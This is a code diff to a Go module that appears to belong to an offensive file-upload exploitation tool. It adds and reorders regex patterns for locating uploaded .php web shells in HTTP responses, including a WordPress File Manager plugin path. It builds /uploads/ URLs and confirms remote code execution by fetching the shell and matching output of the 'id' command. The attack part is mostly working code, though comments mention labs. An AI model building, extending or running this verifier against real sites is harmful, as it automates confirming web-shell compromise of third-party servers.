@@ -48,26 +48,47 @@ func NewRCEVerifier(client *http.Client, timeout time.Duration) *RCEVerifier {
 		timeout: timeout,
 		command: "id",
 		patterns: []PathPattern{
+			// Simple HTML upload patterns (for labs and simple apps)
 			{
-				Regex: regexp.MustCompile(`(?i)"(?:url|path|file|filename|location|href|src)"\s*:\s*"([^"]+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js))"`),
-				Type:  "json",
+				Regex: regexp.MustCompile(`(?i)href=['"]uploads/([^'"]+\.php)['"]`),
+				Type:  "html-upload",
 			},
 			{
-				Regex: regexp.MustCompile(`(?i)(?:href|src|action|url|path|file|location)=["']([^"']+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js))["']`),
-				Type:  "html",
+				Regex: regexp.MustCompile(`(?i)uploads/([a-zA-Z0-9_\-]+\.php)`),
+				Type:  "uploads-path",
 			},
 			{
-				Regex: regexp.MustCompile(`(?i)(?:uploads|upload|files|images|media|tmp|temp|data|storage|static|assets)/[^"'\s<>]+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js)`),
-				Type:  "text",
-			},
-			{
-				Regex: regexp.MustCompile(`(?i)Location:\s*([^\s]+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js))`),
-				Type:  "header",
+				Regex: regexp.MustCompile(`(?i)Location:\s*(?:<[^>]+>)?\s*['"]?([^'"<>\s]+\.php)['"]?`),
+				Type:  "html-location",
 			},
 			// WordPress File Manager specific pattern
 			{
 				Regex: regexp.MustCompile(`"name":"([^"]+\.php)"`),
 				Type:  "wordpress",
+			},
+			// JSON patterns
+			{
+				Regex: regexp.MustCompile(`(?i)"url":"([^"]+\.php)"`),
+				Type:  "json-url",
+			},
+			{
+				Regex: regexp.MustCompile(`(?i)"(?:url|path|file|filename|location|href|src)"\s*:\s*"([^"]+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js))"`),
+				Type:  "json",
+			},
+			// HTML patterns
+			{
+				Regex: regexp.MustCompile(`(?i)(?:href|src|action|url|path|file|location)=["']([^"']+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js))["']`),
+				Type:  "html",
+			},
+			// Text patterns
+			{
+				Regex: regexp.MustCompile(`(?i)(?:uploads|upload|files|images|media|tmp|temp|data|storage|static|assets)/[^"'\s<>]+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js)`),
+				Type:  "text",
+			},
+			// Header patterns
+			{
+				Regex: regexp.MustCompile(`(?i)Location:\s*([^\s]+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js))`),
+				Type:  "header",
 			},
 		},
 	}
@@ -79,6 +100,21 @@ func (v *RCEVerifier) VerifyRCE(result *types.Result, baseURL string) error {
 	}
 
 	startTime := time.Now()
+
+	// Try simple upload verification first (for labs and simple apps)
+	if strings.Contains(result.ResponseBody, "uploads/") ||
+		strings.Contains(result.ResponseBody, "File uploaded") ||
+		strings.Contains(result.ResponseBody, "uploaded successfully") {
+		fileURL, verified, proof := v.verifySimpleUpload(result, baseURL)
+		if verified {
+			result.RCEVerified = true
+			result.RCEProof = proof
+			result.FileURL = fileURL
+			result.RCECommand = v.command
+			result.VerificationTime = time.Since(startTime)
+			return nil
+		}
+	}
 
 	// Extract file path from response
 	filePath := v.extractFilePath(result.ResponseBody, result.ResponseHeaders, baseURL)
@@ -105,6 +141,41 @@ func (v *RCEVerifier) VerifyRCE(result *types.Result, baseURL string) error {
 	return nil
 }
 
+// verifySimpleUpload handles simple HTML responses with uploads/ paths
+func (v *RCEVerifier) verifySimpleUpload(result *types.Result, baseURL string) (string, bool, string) {
+	// Extract filename from various patterns
+	patterns := []string{
+		`href=['"]uploads/([^'"]+\.php)['"]`,
+		`uploads/([a-zA-Z0-9_\-]+\.php)`,
+		`Location:\s*['"]?([^'"<>\s]+\.php)['"]?`,
+		`([a-zA-Z0-9_\-]+\.php)`,
+	}
+
+	var filename string
+	for _, pattern := range patterns {
+		if matches := regexp.MustCompile(pattern).FindStringSubmatch(result.ResponseBody); len(matches) > 1 {
+			filename = matches[1]
+			break
+		}
+	}
+
+	if filename == "" {
+		return "", false, ""
+	}
+
+	// Construct the URL - assume uploads/ directory
+	baseURLParsed, err := url.Parse(baseURL)
+	if err != nil {
+		return "", false, ""
+	}
+
+	fileURL := fmt.Sprintf("%s://%s/uploads/%s", baseURLParsed.Scheme, baseURLParsed.Host, filename)
+
+	// Verify execution
+	verified, proof := v.verifyExecution(fileURL)
+	return fileURL, verified, proof
+}
+
 func (v *RCEVerifier) extractFilePath(body string, headers map[string]string, baseURL string) string {
 	// Special handling for WordPress File Manager
 	if strings.Contains(baseURL, "wp-file-manager") {
@@ -114,14 +185,26 @@ func (v *RCEVerifier) extractFilePath(body string, headers map[string]string, ba
 	// Check all patterns against body
 	for _, pattern := range v.patterns {
 		if matches := pattern.Regex.FindStringSubmatch(body); len(matches) > 1 {
-			return matches[1]
+			path := matches[1]
+
+			// Normalize the path
+			if pattern.Type == "html-upload" || pattern.Type == "uploads-path" {
+				// Ensure it starts with /uploads/
+				if !strings.HasPrefix(path, "/") {
+					path = "/uploads/" + path
+				}
+			}
+
+			return path
 		}
 	}
 
 	// Check headers for location
 	if location, ok := headers["Location"]; ok {
-		if matches := v.patterns[3].Regex.FindStringSubmatch(location); len(matches) > 1 {
-			return matches[1]
+		for _, pattern := range v.patterns {
+			if matches := pattern.Regex.FindStringSubmatch(location); len(matches) > 1 {
+				return matches[1]
+			}
 		}
 	}
 
@@ -130,12 +213,8 @@ func (v *RCEVerifier) extractFilePath(body string, headers map[string]string, ba
 
 // extractWordPressFilePath handles WordPress File Manager responses
 func (v *RCEVerifier) extractWordPressFilePath(body string) string {
-	// WordPress File Manager returns JSON with "name" and "url" fields
-	// Example: {"added":[{"name":"test-rce.php","url":"\/wordpress\/wp-content\/plugins\/wp-file-manager\/lib\/php\/..\/files\/test-rce.php"}]}
-
 	// Try to extract the URL first
 	if matches := regexp.MustCompile(`"url":"([^"]+\.php)"`).FindStringSubmatch(body); len(matches) > 1 {
-		// Clean up the URL (remove escaped slashes)
 		url := strings.ReplaceAll(matches[1], `\/`, `/`)
 		return url
 	}
@@ -143,7 +222,6 @@ func (v *RCEVerifier) extractWordPressFilePath(body string) string {
 	// If no URL, extract filename and construct path
 	if matches := regexp.MustCompile(`"name":"([^"]+\.php)"`).FindStringSubmatch(body); len(matches) > 1 {
 		filename := matches[1]
-		// WordPress File Manager stores files in lib/files/ directory
 		return fmt.Sprintf("/wordpress/wp-content/plugins/wp-file-manager/lib/files/%s", filename)
 	}
 
@@ -167,20 +245,15 @@ func (v *RCEVerifier) resolveURL(baseURL, filePath string) string {
 		return fmt.Sprintf("%s://%s%s", base.Scheme, base.Host, filePath)
 	}
 
-	// Handle relative to current path
-	basePath := base.Path
-	if idx := strings.LastIndex(basePath, "/"); idx != -1 {
-		basePath = basePath[:idx+1]
-	}
-
-	return fmt.Sprintf("%s://%s%s%s", base.Scheme, base.Host, basePath, filePath)
+	// Handle relative to current path - assume uploads directory
+	return fmt.Sprintf("%s://%s/uploads/%s", base.Scheme, base.Host, filePath)
 }
 
 func (v *RCEVerifier) verifyExecution(fileURL string) (bool, string) {
 	ctx, cancel := context.WithTimeout(context.Background(), v.timeout)
 	defer cancel()
 
-	// Clean up the URL if needed (resolve ../ in paths)
+	// Clean up the URL if needed
 	fileURL = cleanURL(fileURL)
 
 	// First, check if file executes (not showing source)
@@ -243,15 +316,11 @@ func (v *RCEVerifier) verifyExecution(fileURL string) (bool, string) {
 
 // cleanURL resolves ../ in URLs
 func cleanURL(rawURL string) string {
-	// Parse the URL
 	u, err := url.Parse(rawURL)
 	if err != nil {
 		return rawURL
 	}
-
-	// Clean the path
 	u.Path = path.Clean(u.Path)
-
 	return u.String()
 }
 
@@ -316,6 +385,9 @@ func (v *RCEVerifier) extractProof(output string) string {
 		"home=",
 		"PWD=",
 		"USER=",
+		"haakimsec", // Add common usernames
+		"kali",
+		"parrot",
 		"RCE_TEST_MARKER:",
 		"RCE_SUCCESS:",
 	}
